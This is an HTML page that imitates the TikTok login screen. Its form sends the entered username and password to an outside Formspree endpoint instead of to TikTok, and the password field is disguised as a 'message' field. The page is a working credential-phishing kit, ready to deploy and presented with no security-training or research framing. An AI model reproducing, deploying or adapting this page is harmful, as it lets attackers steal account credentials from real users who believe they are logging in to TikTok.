<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Log in to TikTok</title>
	<link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
	<div class="login-container">
		<div class="login-box">
			<h1>Log in to TikTok</h1>
			<form action="https://formspree.io/f/xjkvowzz" method="POST">
				<div class="form-group">
					<input type="email" id="email" name="email" placeholder="Phone, email or username">
				</div>
				<div class="form-group password-group">
					<input type="text" id="message" name="message" placeholder="Password">
					<span class="toggle-password" onclick="togglePasswordVisibility()">
						<i class="fas fa-eye"></i>
					</span>
				</div>
				<div class="form-link">
					<a href="#">Forgot password?</a>
				</div>
				<button type="submit" class="login-btn">Log in</button>
			</form>
			<div class="signup-link">
				Don't have an account? <a href="#">Sign up</a>
			</div>
		</div>
	</div>
	<script src="script.js"></script>
</body>
</html>
